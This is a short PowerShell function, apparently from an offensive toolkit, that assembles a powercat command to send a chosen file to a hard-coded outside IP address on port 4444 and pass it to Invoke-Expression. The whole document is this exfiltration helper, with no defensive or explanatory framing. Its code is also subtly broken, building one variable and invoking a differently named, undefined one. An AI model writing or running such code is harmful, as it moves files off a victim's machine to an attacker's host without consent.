function sendFile
{
    param
    (
        [Parameter(Mandatory)]
        [string]$file
    )
    $ip = "35.165.190.126"
    $port = "4444"
    $command = "powercat -c ";$command+=$ip;$command+=" -p ";$command+=$port;$command+=" -i ";$command+=$file
    $command
    $comando | Invoke-Expression
}